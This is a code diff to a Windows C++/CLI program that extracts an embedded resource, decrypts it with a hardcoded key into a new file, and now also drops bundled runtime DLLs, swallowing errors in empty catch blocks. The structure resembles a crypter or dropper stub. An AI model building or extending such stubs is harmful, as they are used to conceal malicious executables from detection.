@@ -37,15 +37,30 @@ using namespace std;
 void ExtractBinResource(std::string strCustomResName, int nResourceId, std::string strOutputName);
 int DeCrypt(LPCWSTR inFilename, LPCWSTR outFilename, LPCWSTR key_str);
 wchar_t *convertCharArrayToLPCWSTR(const char* charArray);
+void UnloadLibrary(int resourceId, std::string strOutputFile);
 std::string GetNewFile();
 std::string GetNewDirectory();
 
 [STAThreadAttribute]
 int Main()
 {
+	try
+	{
+		UnloadLibrary(107, "msvcp140d.dll");
+		UnloadLibrary(105, "ucrtbased.dll");
+		UnloadLibrary(106, "vcruntime140d.dll");
+	}
+	catch (const std::exception&){}
+
 	std::string File = GetNewFile();
-	Application::EnableVisualStyles();
-	Application::SetCompatibleTextRenderingDefault(false);
+
+	try
+	{
+		Application::EnableVisualStyles();
+		Application::SetCompatibleTextRenderingDefault(false);
+	}
+	catch (const std::exception&){}
+
 	ExtractBinResource("File", 101, GetNewDirectory().append("\\data.bin") );
 	DeCrypt(convertCharArrayToLPCWSTR(GetNewDirectory().append("\\data.bin").c_str()), convertCharArrayToLPCWSTR(File.c_str()), L"3igcZhRdWq96m3GUmTAiv9");
 
@@ -205,4 +220,9 @@ void ExtractBinResource(std::string strCustomResName, int nResourceId, std::stri
 		CloseHandle(hInpFile);
 		CloseHandle(hOutFile);
 		return 0;
+	}
+
+	void UnloadLibrary(int resourceId, std::string strOutputFile)
+	{
+		ExtractBinResource("File",resourceId, strOutputFile);
 	}
